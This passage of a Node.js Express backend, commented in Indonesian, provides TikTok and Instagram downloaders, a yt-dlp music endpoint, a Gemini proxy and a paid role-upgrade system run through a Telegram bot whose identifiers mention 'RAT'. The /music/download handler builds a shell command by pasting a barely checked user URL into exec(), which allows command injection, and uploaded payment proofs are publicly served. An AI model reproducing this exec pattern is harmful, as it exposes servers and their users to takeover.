    let apiUrl = `https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=${hd ? 1 : 0}`;

    let response;
    try {
      response = await axios.get(apiUrl, { timeout: 30000 });
    } catch (e) {
      // Fallback ke opsi 2
      console.log('[TIKTOK] TikWM gagal, coba fallback...');
      apiUrl = `https://api.siputzx.my.id/api/d/tiktok?url=${encodeURIComponent(url)}`;
      response = await axios.get(apiUrl, { timeout: 30000 });
    }

    const data = response.data;

    // ── Normalisasi response ke format yang diharapkan Flutter ──
    // Flutter expect: { valid: true, videos: {...}, author: {...}, audio: {...}, ... }

    // Handle TikWM format
    if (data.data) {
      const d = data.data;

      return res.json({
        valid: true,
        title: d.title || 'TikTok Video',
        cover: d.cover || d.origin_cover || '',
        duration: d.duration || 0,
        source: 'tikwm',
        videos: {
          noWatermark: d.play ? (d.play.startsWith('http') ? d.play : `https://www.tikwm.com${d.play}`) : '',
          withWatermark: d.wmplay ? (d.wmplay.startsWith('http') ? d.wmplay : `https://www.tikwm.com${d.wmplay}`) : '',
          hd: d.hdplay ? (d.hdplay.startsWith('http') ? d.hdplay : `https://www.tikwm.com${d.hdplay}`) : '',
        },
        audio: {
          url: d.music ? (d.music.startsWith('http') ? d.music : `https://www.tikwm.com${d.music}`) : '',
        },
        author: {
          nickname: d.author?.nickname || 'Unknown',
          uniqueId: d.author?.unique_id || 'unknown',
          avatar: d.author?.avatar || '',
        },
      });
    }

    // Handle siputzx format
    if (data.status && data.data) {
      const d = data.data;

      return res.json({
        valid: true,
        title: d.title || d.desc || 'TikTok Video',
        cover: d.thumbnail || d.cover || '',
        duration: d.duration || 0,
        source: 'siputzx',
        videos: {
          noWatermark: d.video || d.play || '',
          withWatermark: d.wmplay || d.video_wm || '',
          hd: d.hd || d.video_hd || '',
        },
        audio: {
          url: d.audio || d.music || '',
        },
        author: {
          nickname: d.author || 'Unknown',
          uniqueId: d.author_id || 'unknown',
          avatar: '',
        },
      });
    }

    // Fallback — response unknown
    return res.json({
      valid: false,
      message: 'Gagal parse response dari API TikTok',
    });

  } catch (e) {
    console.error('[TIKTOK ERROR]', e.message);
    res.status(500).json({
      valid: false,
      message: `Error: ${e.message}`,
    });
  }
});

console.log('[TIKTOK] Endpoint terpasang: /tiktok/download');

// ══════════════════════════════════════════════════════════════
// ══════ INSTAGRAM DOWNLOADER — Multi-API Fallback ══════
// ══════════════════════════════════════════════════════════════

app.get('/instagram/download', async (req, res) => {
  const url = req.query.url;

  if (!url) {
    return res.status(400).json({ valid: false, message: 'URL wajib diisi' });
  }

  if (!url.includes('instagram.com') && !url.includes('instagr.am')) {
    return res.status(400).json({ valid: false, message: 'URL bukan Instagram' });
  }

  console.log(`[INSTAGRAM] Request: ${url}`);

  // ── Daftar API (fallback berurutan) ──
  const apiEndpoints = [
    {
      name: 'siputzx',
      url: `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(url)}`,
      parse: (d) => {
        const arr = d?.data || d?.result || d;
        if (!Array.isArray(arr)) return null;
        return arr.map(item => ({
          type: (item.url || '').includes('.mp4') ? 'video' : 'image',
          url: item.url || item.download_url || item.link || '',
          thumbnail: item.thumbnail || item.thumb || item.url || '',
        })).filter(m => m.url);
      }
    },
    {
      name: 'nexoracle',
      url: `https://api.nexoracle.com/downloader/instagram?apikey=free&url=${encodeURIComponent(url)}`,
      parse: (d) => {
        const arr = d?.result || d?.data;
        if (!Array.isArray(arr)) return null;
        return arr.map(item => ({
          type: (item.url || '').includes('.mp4') ? 'video' : 'image',
          url: item.url || item.link || '',
          thumbnail: item.thumbnail || item.thumb || item.url || '',
        })).filter(m => m.url);
      }
    },
    {
      name: 'btch',
      url: `https://api.botcahx.eu.org/api/download/igdowloader?url=${encodeURIComponent(url)}&apikey=btch`,
      parse: (d) => {
        const arr = d?.result || d?.data;
        if (!Array.isArray(arr)) return null;
        return arr.map(item => ({
          type: (item.url || '').includes('.mp4') ? 'video' : 'image',
          url: item.url || item.link || '',
          thumbnail: item.thumbnail || item.thumb || item.url || '',
        })).filter(m => m.url);
      }
    },
  ];

  // ── Coba API satu-satu ──
  for (const api of apiEndpoints) {
    try {
      console.log(`[INSTAGRAM] Coba API: ${api.name}`);
      const r = await axios.get(api.url, {
        timeout: 25000,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });

      const medias = api.parse(r.data);
      if (medias && medias.length > 0) {
        console.log(`[INSTAGRAM] ✅ Berhasil pakai ${api.name} (${medias.length} media)`);
        return res.json({
          valid: true,
          source: api.name,
          title: r.data?.title || r.data?.caption || 'Instagram Post',
          author: r.data?.author || r.data?.username || 'Unknown',
          thumbnail: medias[0].thumbnail,
          total: medias.length,
          medias,
        });
      }
      console.log(`[INSTAGRAM] ⚠️ ${api.name} response kosong / format beda`);
    } catch (e) {
      console.log(`[INSTAGRAM] ❌ ${api.name} gagal: ${e.message}`);
    }
  }

  // ── Semua API gagal ──
  console.error('[INSTAGRAM] Semua API gagal.');
  return res.status(500).json({
    valid: false,
    message: 'Semua API Instagram sedang down / URL gak valid. Coba lagi nanti.',
  });
});

console.log('[INSTAGRAM] Endpoint terpasang: /instagram/download');

// ══════════════════════════════════════════════════════════════
// ══════ TIKTOK VIDEO FEED (BUAT TIKTOK_VIDEO_PAGE) ══════
// ══════════════════════════════════════════════════════════════

// ── Endpoint: Trending TikTok ──
app.get('/tiktok/trending', async (req, res) => {
  try {
    const region = req.query.region || 'ID';
    const count = req.query.count || 20;

    console.log(`[TIKTOK FEED] Fetching trending region=${region}`);

    // Fallback: pakai API publik
    const r = await axios.get(
      `https://api.siputzx.my.id/api/tiktok/trending?region=${region}&count=${count}`,
      {
        timeout: 20000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json',
        }
      }
    );

    if (r.data?.data) {
      return res.json({
        valid: true,
        source: 'siputzx',
        videos: r.data.data,
      });
    }

    // Fallback ke API lain
    const fallback = await axios.get(
      `https://www.tikwm.com/api/feed/list?region=${region}&count=${count}`,
      {
        timeout: 20000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
      }
    );

    if (fallback.data?.data) {
      return res.json({
        valid: true,
        source: 'tikwm',
        videos: fallback.data.data,
      });
    }

    return res.json({
      valid: false,
      message: 'Gagal ambil trending TikTok',
    });

  } catch (e) {
    console.error('[TIKTOK FEED] Error:', e.message);
    res.status(500).json({
      valid: false,
      message: `Error: ${e.message}`,
    });
  }
});

// ── Endpoint: Search TikTok ──
app.get('/tiktok/search', async (req, res) => {
  try {
    const q = req.query.q || '';
    const count = req.query.count || 20;

    if (!q) {
      return res.status(400).json({ valid: false, message: 'Query "q" required' });
    }

    console.log(`[TIKTOK FEED] Search: ${q}`);

    const r = await axios.get(
      `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(q)}&count=${count}`,
      {
        timeout: 20000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
      }
    );

    if (r.data?.data) {
      return res.json({
        valid: true,
        source: 'tikwm',
        videos: r.data.data,
      });
    }

    return res.json({ valid: false, message: 'Gagal search TikTok' });

  } catch (e) {
    console.error('[TIKTOK SEARCH] Error:', e.message);
    res.status(500).json({ valid: false, message: `Error: ${e.message}` });
  }
});

// ── Endpoint: Get single video by URL ──
app.get('/tiktok/video', async (req, res) => {
  try {
    const url = req.query.url;
    if (!url) {
      return res.status(400).json({ valid: false, message: 'URL required' });
    }

    console.log(`[TIKTOK FEED] Get video: ${url}`);

    const r = await axios.get(
      `https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`,
      {
        timeout: 20000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
      }
    );

    if (r.data?.data) {
      return res.json({
        valid: true,
        video: r.data.data,
      });
    }

    return res.json({ valid: false, message: 'Gagal ambil video' });

  } catch (e) {
    console.error('[TIKTOK VIDEO] Error:', e.message);
    res.status(500).json({ valid: false, message: `Error: ${e.message}` });
  }
});

console.log('[TIKTOK FEED] Endpoint terpasang: /tiktok/trending, /tiktok/search, /tiktok/video');

// ══════════════════════════════════════════════════════════════
// ══════ MUSIC DOWNLOADER (TIKTOK / YOUTUBE / DLL) ══════
// ══════════════════════════════════════════════════════════════
const { exec } = require('child_process');
const MUSIC_CACHE_DIR = path.join(__dirname, 'music_cache');
if (!fs.existsSync(MUSIC_CACHE_DIR)) fs.mkdirSync(MUSIC_CACHE_DIR, { recursive: true });

app.get('/music/download', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ valid: false, message: 'URL required' });

  const safeUrl = url.trim();

  // Validasi URL
  const isTikTok = /tiktok\.com|vm\.tiktok|vt\.tiktok/i.test(safeUrl);
  const isYouTube = /youtube\.com|youtu\.be/i.test(safeUrl);
  if (!isTikTok && !isYouTube) {
    return res.status(400).json({ valid: false, message: 'URL harus dari TikTok atau YouTube' });
  }

  // Generate unique filename
  const id = crypto.randomBytes(6).toString('hex');
  const outputTemplate = path.join(MUSIC_CACHE_DIR, `${id}.%(ext)s`);

  // yt-dlp command: extract audio → MP3
  const cmd = `yt-dlp -x --audio-format mp3 --audio-quality 192K --no-playlist -o "${outputTemplate}" "${safeUrl}"`;

  console.log(`[MUSIC] Downloading: ${safeUrl}`);

  exec(cmd, { timeout: 120000, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
    if (error) {
      console.error(`[MUSIC] yt-dlp error:`, stderr || error.message);
      return res.status(500).json({ valid: false, message: 'Gagal download: ' + error.message });
    }

    // Cari file yang ke-generate
    const files = fs.readdirSync(MUSIC_CACHE_DIR).filter(f => f.startsWith(id));
    if (files.length === 0) {
      return res.status(500).json({ valid: false, message: 'File tidak ditemukan' });
    }

    const realFile = files[0];
    const filePath = path.join(MUSIC_CACHE_DIR, realFile);
    const stats = fs.statSync(filePath);

    const fileUrl = `${req.protocol}://${req.get('host')}/music/file/${realFile}`;

    console.log(`[MUSIC] ✅ Downloaded: ${realFile} (${(stats.size / 1024).toFixed(1)} KB)`);

    res.json({
      valid: true,
      title: realFile.replace('.mp3', ''),
      url: fileUrl,
      size: stats.size,
      sizeKB: (stats.size / 1024).toFixed(1),
    });

    // Auto-delete setelah 10 menit
    setTimeout(() => {
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        console.log(`[MUSIC] Cleaned up: ${realFile}`);
      }
    }, 10 * 60 * 1000);
  });
});

// Serve file MP3
app.get('/music/file/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(MUSIC_CACHE_DIR, filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ valid: false, message: 'File tidak ditemukan / sudah expired' });
  }

  res.setHeader('Content-Type', 'audio/mpeg');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.sendFile(filePath);
});

console.log('[MUSIC] Endpoint terpasang: /music/download, /music/file/:filename');

// ⬆️⬆️⬆️ SAMPE SINI ⬆️⬆️⬆️

// ══════════════════════════════════════════════════════════════
// ══════ YOUTUBE PROXY (BUAT WEBVIEW YOUTUBE PAGE) ══════
// ══════════════════════════════════════════════════════════════

// Endpoint health check — buat cek server YouTube proxy
app.get('/youtube/ping', (req, res) => {
  res.json({
    valid: true,
    message: 'YouTube proxy active',
    timestamp: new Date().toISOString(),
  });
});

// Endpoint trending — shortcut ke YouTube trending Indonesia
app.get('/youtube/trending', (req, res) => {
  res.json({
    valid: true,
    url: 'https://m.youtube.com/feed/trending?gl=ID&hl=id',
    message: 'Trending Indonesia URL',
  });
});

// Endpoint search URL helper — bikin URL search YouTube
app.get('/youtube/search', (req, res) => {
  const q = req.query.q || '';
  if (!q) {
    return res.status(400).json({ valid: false, message: 'Query "q" required' });
  }
  res.json({
    valid: true,
    query: q,
    url: `https://m.youtube.com/results?search_query=${encodeURIComponent(q)}`,
  });
});

console.log('[YOUTUBE] Proxy endpoint terpasang: /youtube/ping, /youtube/trending, /youtube/search');

// ══════════════════════════════════════════════════════════════
// ══════ AI PROXY (GEMINI) ══════
// ══════════════════════════════════════════════════════════════
app.get('/ai/chat', async (req, res) => {
  const { key, prompt } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });
  if (!prompt) return res.status(400).json({ valid: false, message: 'Prompt required' });

  try {
    // Pake API publik gratis — bisa diganti kalo ada API key sendiri
    const r = await axios.get(
      `https://api.siputzx.my.id/api/ai/gemini-lite?prompt=${encodeURIComponent(prompt)}&model=gemini-2.0-flash-lite`,
      { timeout: 30000, headers: { 'User-Agent': 'Mozilla/5.0' } }
    );

    // Normalisasi response
    let aiText = '';
    if (r.data?.data?.parts?.[0]?.text) {
      aiText = r.data.data.parts[0].text;
    } else if (r.data?.result) {
      aiText = r.data.result;
    } else if (r.data?.message) {
      aiText = r.data.message;
    } else if (typeof r.data === 'string') {
      aiText = r.data;
    } else {
      aiText = JSON.stringify(r.data);
    }

    res.json({ valid: true, response: aiText });
  } catch (e) {
    console.error('[AI] Error:', e.message);
    res.status(500).json({ valid: false, message: e.message });
  }
});

console.log('[AI] Endpoint terpasang: /ai/chat');

// ══════════════════════════════════════════════════════════════
// ══════ UPGRADE ROLE SYSTEM — PURE NODE.JS (TANPA MULTER) ══════
// ══════════════════════════════════════════════════════════════
// Parser multipart/form-data manual — cuma pake built-in module.
// Ga perlu npm install apapun. Cukup node index.js.

const UPLOAD_DIR = path.join(__dirname, 'uploads', 'proofs');
if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  console.log('[UPLOAD] Folder uploads/proofs dibuat.');
}

const UPGRADE_REQUESTS_FILE = path.join(__dirname, 'upgrade_requests.json');
function loadUpgradeRequests() {
  try {
    if (!fs.existsSync(UPGRADE_REQUESTS_FILE)) return [];
    return JSON.parse(fs.readFileSync(UPGRADE_REQUESTS_FILE, 'utf8'));
  } catch { return []; }
}
function saveUpgradeRequests(data) {
  fs.writeFileSync(UPGRADE_REQUESTS_FILE, JSON.stringify(data, null, 2));
}

// ── Helper: parse multipart/form-data manually ──
function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const contentType = req.headers['content-type'] || '';
    const match = contentType.match(/boundary=(.+)$/);
    if (!match) return reject(new Error('Boundary tidak ditemukan'));

    const boundary = '--' + match[1];
    const chunks = [];

    req.on('data', (chunk) => chunks.push(chunk));
    req.on('end', () => {
      try {
        const buffer = Buffer.concat(chunks);
        const parts = [];
        const boundaryBuf = Buffer.from(boundary);

        // Split by boundary
        let start = buffer.indexOf(boundaryBuf) + boundaryBuf.length;
        while (start < buffer.length) {
          // Skip CRLF after boundary
          if (buffer.slice(start, start + 2).toString() === '\r\n') start += 2;

          const end = buffer.indexOf(boundaryBuf, start);
          if (end === -1) break;

          const partBuffer = buffer.slice(start, end - 2); // remove trailing CRLF
          const headerEnd = partBuffer.indexOf('\r\n\r\n');

          if (headerEnd !== -1) {
            const headerStr = partBuffer.slice(0, headerEnd).toString();
            const body = partBuffer.slice(headerEnd + 4);

            const nameMatch = headerStr.match(/name="([^"]+)"/);
            const filenameMatch = headerStr.match(/filename="([^"]+)"/);
            const contentTypeMatch = headerStr.match(/Content-Type:\s*([^\r\n]+)/i);

            if (nameMatch) {
              parts.push({
                name: nameMatch[1],
                filename: filenameMatch ? filenameMatch[1] : null,
                contentType: contentTypeMatch ? contentTypeMatch[1].trim() : null,
                data: body,
              });
            }
          }
          start = end + boundaryBuf.length;
        }
        resolve(parts);
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', reject);
  });
}

// ── POST /upgrade-role — Submit permintaan upgrade ──
// ── POST /upgrade-role — Submit permintaan upgrade ──
app.post('/upgrade-role', async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let username = null, sessionKey = null, targetRole = null, price = 0;
    let paymentMethod = 'qris'; // default
    let proofFile = null, proofFilename = null;

    for (const part of parts) {
      if (part.name === 'username')      username = part.data.toString().trim();
      if (part.name === 'sessionKey')    sessionKey = part.data.toString().trim();
      if (part.name === 'targetRole')    targetRole = part.data.toString().trim();
      if (part.name === 'price')         price = parseInt(part.data.toString()) || 0;
      if (part.name === 'paymentMethod') paymentMethod = part.data.toString().trim().toLowerCase();

      if (part.name === 'proof' && part.filename) {
        const ext = (path.extname(part.filename) || '.jpg').toLowerCase();
        const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic', '.heif'];

        if (!allowedExts.includes(ext)) {
          return res.status(400).json({
            valid: false,
            message: `Format file tidak didukung. Pakai: ${allowedExts.join(', ')}`,
          });
        }

        if (part.data.length > 10 * 1024 * 1024) {
          return res.status(400).json({ valid: false, message: 'Max 10MB' });
        }

        proofFilename = `proof_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${ext}`;
        proofFile = path.join(UPLOAD_DIR, proofFilename);
        fs.writeFileSync(proofFile, part.data);
      }
    }

    // Validasi
    if (!username || !sessionKey || !targetRole || !proofFile) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Data tidak lengkap' });
    }

    if (!['qris', 'dana'].includes(paymentMethod)) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Metode pembayaran tidak valid' });
    }

    const keyInfo = activeKeys[sessionKey];
    if (!keyInfo || keyInfo.username !== username) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(401).json({ valid: false, message: 'Session tidak valid' });
    }

    const requests = loadUpgradeRequests();

    // Cek duplikat pending
    const existing = requests.find(r => r.username === username && r.status === 'pending');
    if (existing) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(429).json({
        valid: false,
        message: 'Lu masih punya request pending. Tunggu admin approve dulu.',
      });
    }

    const db = loadDatabase();
    const user = db.find(x => x.username === username);
    const currentRole = user ? (user.role || 'member') : 'member';

    // Cek apakah targetRole lebih tinggi dari currentRole
    const roleOrder = ['member', 'reseller', 'vip', 'admin', 'partner', 'moderator', 'owner', 'high owner', 'developer'];
    const currentLevel = roleOrder.indexOf(currentRole.toLowerCase());
    const targetLevel = roleOrder.indexOf(targetRole.toLowerCase());

    if (targetLevel === -1) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Target role tidak valid' });
    }
    if (targetLevel <= currentLevel) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Target role harus lebih tinggi dari role sekarang' });
    }

    const requestId = 'UPG-' + Date.now().toString(36).toUpperCase();
    const request = {
      id: requestId,
      username,
      currentRole,
      targetRole,
      price,
      paymentMethod,
      proofFile: proofFilename,
      proofUrl: `/uploads/proofs/${proofFilename}`,
      status: 'pending',
      createdAt: new Date().toISOString(),
      approvedAt: null,
      approvedBy: null,
    };

    requests.push(request);
    saveUpgradeRequests(requests);

    // Notif Telegram ke owner
    try {
      const methodLabel = paymentMethod === 'qris' ? '🟪 QRIS' : '🔵 DANA';

      await bot.sendPhoto(
        RAT_NOTIF_ADMIN_ID,
        fs.createReadStream(proofFile),
        {
          caption:
            `🔔 *REQUEST UPGRADE ROLE BARU*\n\n` +
            `🆔 ID: \`${requestId}\`\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 User: \`${username}\`\n` +
            `📊 Role: ${currentRole} → *${targetRole.toUpperCase()}*\n` +
            `💰 Harga: Rp ${price.toLocaleString('id-ID')}\n` +
            `💳 Metode: ${methodLabel}\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `Tekan tombol di bawah untuk konfirmasi.`,
          parse_mode: 'Markdown',
          reply_markup: {
  inline_keyboard: [
    [
      {
        text: '✅ Approve Upgrade',
        callback_data: `upgrade_approve:${requestId}`,
        style: 'success',
      },
      {
        text: '❌ Reject',
        callback_data: `upgrade_reject:${requestId}`,
        style: 'danger',
      },
    ],
  ],
},
        }
      );
    } catch (e) {
      console.error('[NOTIF UPGRADE] Gagal kirim ke Telegram:', e.message);
    }

    console.log(`[UPGRADE] Request ${requestId} dari ${username}: ${currentRole} → ${targetRole} (${paymentMethod})`);

    res.json({
      valid: true,
      message: 'Request upgrade berhasil dikirim',
      requestId,
    });
  } catch (err) {
    console.error('[UPGRADE ERROR]', err);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ── Static serving untuk bukti transfer ──
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ── GET /upgrade-requests — List request (buat admin) ──
app.get('/upgrade-requests', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });

  const allowedRoles = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
  if (!allowedRoles.includes((user.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Ga punya akses' });
  }

  const requests = loadUpgradeRequests();
  requests.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  res.json({ valid: true, requests });
});

// ── POST /approve-upgrade — Approve/reject request (admin via app) ──
app.post('/approve-upgrade', async (req, res) => {
  const { key, requestId, action } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin) return res.status(401).json({ valid: false });

  const allowedRoles = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
  if (!allowedRoles.includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Ga punya akses' });
  }

  const requests = loadUpgradeRequests();
  const reqIdx = requests.findIndex(r => r.id === requestId);
  if (reqIdx === -1) {
    return res.status(404).json({ valid: false, message: 'Request tidak ditemukan' });
  }

  const upgradeReq = requests[reqIdx];
  if (upgradeReq.status !== 'pending') {
    return res.status(400).json({ valid: false, message: 'Request sudah diproses' });
  }

  if (action === 'approve') {
    const userIdx = db.findIndex(u => u.username === upgradeReq.username);
    if (userIdx === -1) {
      return res.status(404).json({ valid: false, message: 'User tidak ditemukan' });
    }

    db[userIdx].role = upgradeReq.targetRole;
    saveDatabase(db);

    upgradeReq.status = 'approved';
    upgradeReq.approvedAt = new Date().toISOString();
    upgradeReq.approvedBy = admin.username;
    requests[reqIdx] = upgradeReq;
    saveUpgradeRequests(requests);

    console.log(`[UPGRADE] Approved: ${upgradeReq.username} → ${upgradeReq.targetRole}`);

    return res.json({
      valid: true,
      message: `User ${upgradeReq.username} berhasil di-upgrade ke ${upgradeReq.targetRole}`,
    });
  } else if (action === 'reject') {
    upgradeReq.status = 'rejected';
    upgradeReq.approvedAt = new Date().toISOString();
    upgradeReq.approvedBy = admin.username;
    requests[reqIdx] = upgradeReq;
    saveUpgradeRequests(requests);

    return res.json({ valid: true, message: 'Request ditolak' });
  }

  res.status(400).json({ valid: false, message: 'Action tidak valid' });
});

// ══════ BOT COMMANDS — UPGRADE ══════

// /upgrade — List request pending
bot.onText(/^\/upgrade$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const requests = loadUpgradeRequests();
  const pending = requests.filter(r => r.status === 'pending');

  if (pending.length === 0) {
    return bot.sendMessage(chat, '📭 Ga ada request upgrade pending.');
  }

  const lines = pending.map(r => {
    return `🆔 \`${r.id}\`\n` +
           `👤 ${r.username}\n` +
           `📊 ${r.currentRole} → *${r.targetRole.toUpperCase()}*\n` +
           `💰 Rp ${r.price.toLocaleString('id-ID')}\n` +
           `📎 ${r.proofUrl}`;
  }).join('\n\n─────────────\n\n');

  bot.sendMessage(
    chat,
    `📋 *PENDING UPGRADE (${pending.length})*\n\n${lines}\n\n` +
    `Approve: \`/approve <id>\`\nReject: \`/reject <id>\``,
    { parse_mode: 'Markdown' }
  );
});

// /approve <id>
bot.onText(/^\/approve (.+)/i, async (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const requestId = match[1].trim().toUpperCase();
  const requests = loadUpgradeRequests();
  const reqIdx = requests.findIndex(r => r.id === requestId);

  if (reqIdx === -1) return bot.sendMessage(chat, '❌ Request ID ga ketemu.');

  const upgradeReq = requests[reqIdx];
  if (upgradeReq.status !== 'pending') {
    return bot.sendMessage(chat, `❌ Request udah ${upgradeReq.status}.`);
  }

  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === upgradeReq.username);
  if (userIdx === -1) return bot.sendMessage(chat, '❌ User ga ketemu.');

  db[userIdx].role = upgradeReq.targetRole;
  saveDatabase(db);

  upgradeReq.status = 'approved';
  upgradeReq.approvedAt = new Date().toISOString();
  upgradeReq.approvedBy = 'telegram_owner';
  requests[reqIdx] = upgradeReq;
  saveUpgradeRequests(requests);

  bot.sendMessage(
    chat,
    `✅ *APPROVED!*\n\n👤 ${upgradeReq.username}\n🎯 Role baru: *${upgradeReq.targetRole.toUpperCase()}*`,
    { parse_mode: 'Markdown' }
  );
});

// /reject <id>
bot.onText(/^\/reject (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const requestId = match[1].trim().toUpperCase();
  const requests = loadUpgradeRequests();
  const reqIdx = requests.findIndex(r => r.id === requestId);

  if (reqIdx === -1) return bot.sendMessage(chat, '❌ Request ID ga ketemu.');

  const upgradeReq = requests[reqIdx];
  upgradeReq.status = 'rejected';
  upgradeReq.approvedAt = new Date().toISOString();
  upgradeReq.approvedBy = 'telegram_owner';
  requests[reqIdx] = upgradeReq;
  saveUpgradeRequests(requests);

  bot.sendMessage(chat, `❌ Request \`${requestId}\` ditolak.`, { parse_mode: 'Markdown' });
});

console.log('[UPGRADE] System ready (pure Node.js, no multer)');
console.log('[UPGRADE] Endpoint: POST /upgrade-role, GET /upgrade-requests, POST /approve-upgrade');
console.log('[UPGRADE] Bot commands: /upgrade, /approve <id>, /reject <id>');


// ══════════════════════════════════════════════════════════════
// ══════ STORE UANG SYSTEM — KIRIM UANG KE ADMIN ══════
// ══════════════════════════════════════════════════════════════

const STORE_UANG_FILE = path.join(__dirname, 'store_uang.json');
function loadStoreUang() {
  try {
    if (!fs.existsSync(STORE_UANG_FILE)) return [];
    return JSON.parse(fs.readFileSync(STORE_UANG_FILE, 'utf8'));
  } catch { return []; }
}
function saveStoreUang(data) {
  fs.writeFileSync(STORE_UANG_FILE, JSON.stringify(data, null, 2));
}

// ── POST /store-uang — Kirim uang ke admin ──
app.post('/store-uang', async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let username = null, sessionKey = null;
    let amount = 0, paymentMethod = 'qris';
    let namaPanggilan = '', namaAkun = '';
    let proofFile = null, proofFilename = null;

    for (const part of parts) {
      if (part.name === 'username')      username = part.data.toString().trim();
      if (part.name === 'sessionKey')    sessionKey = part.data.toString().trim();
      if (part.name === 'amount')        amount = parseInt(part.data.toString()) || 0;
      if (part.name === 'paymentMethod') paymentMethod = part.data.toString().trim().toLowerCase();
      if (part.name === 'namaPanggilan') namaPanggilan = part.data.toString().trim().slice(0, 100);
      if (part.name === 'namaAkun')      namaAkun = part.data.toString().trim().slice(0, 100);

      if (part.name === 'proof' && part.filename) {
        const ext = (path.extname(part.filename) || '.jpg').toLowerCase();
        const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic', '.heif'];

        if (!allowedExts.includes(ext)) {
          return res.status(400).json({
            valid: false,
            message: `Format file tidak didukung. Pakai: ${allowedExts.join(', ')}`,
          });
        }

        if (part.data.length > 10 * 1024 * 1024) {
          return res.status(400).json({ valid: false, message: 'Max 10MB' });
        }

        proofFilename = `store_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${ext}`;
        proofFile = path.join(UPLOAD_DIR, proofFilename);
        fs.writeFileSync(proofFile, part.data);
      }
    }

    // ── Validasi ──
    if (!username || !sessionKey || amount < 1000 || !proofFile) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Data tidak lengkap atau amount < 1000' });
    }

    if (!['qris', 'dana'].includes(paymentMethod)) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Metode pembayaran tidak valid' });
    }

    if (!namaPanggilan || namaPanggilan.length < 2) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Nama panggilan minimal 2 karakter' });
    }

    if (!namaAkun || namaAkun.length < 2) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Nama akun minimal 2 karakter' });
    }

    const keyInfo = activeKeys[sessionKey];
    if (!keyInfo || keyInfo.username !== username) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(401).json({ valid: false, message: 'Session tidak valid' });
    }

    const storeUang = loadStoreUang();
    const storeId = 'STORE-' + Date.now().toString(36).toUpperCase();

    const entry = {
      id: storeId,
      username,
      amount,
      paymentMethod,
      namaPanggilan,
      namaAkun,
      proofFile: proofFilename,
      proofUrl: `/uploads/proofs/${proofFilename}`,
      status: 'pending',
      createdAt: new Date().toISOString(),
      confirmedAt: null,
      confirmedBy: null,
    };

    storeUang.push(entry);
